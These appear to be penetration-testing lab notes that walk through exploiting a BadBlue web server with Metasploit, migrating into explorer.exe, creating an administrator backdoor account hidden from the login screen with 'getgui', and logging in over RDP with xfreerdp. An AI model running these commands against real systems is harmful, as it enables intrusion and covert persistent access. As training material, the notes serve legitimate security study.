* Get intial foothold on the target through:
* `use exploit/windows/http/badblue_passthru`
* To move to a stable meterpreter session, we need to move on to a more stable process like "explorer.exe"
* `pgrep explorer.exe`
* `migrate [ID fetched from the last command]`
* **Create a new backdoor user account**
  1. We need administrative privileges or permissions to do this.
  2. Then enable the RDP service if it's disabled.
  3. Hide this user from the Windows login screen. Because whenever the system is rebooted, this new user will be shown on the screen raising suspicions.
  4. Add the user to the administrators group.
  5. All of the above can be done through a single command. Inside the meterpreter session obtained earlier:
  6. `run getgui -e -u [New username] -p [new_password]`
  ***
  * **Get a GUI through MSF**
    * `xfreerdp /u:[username setup earlier] /p:[password] /v:[Target IP]`
   
  ***
  * Only cleartext passwords can be used for authentication with RDP, we cannot utilize user account hashes for this purpose.
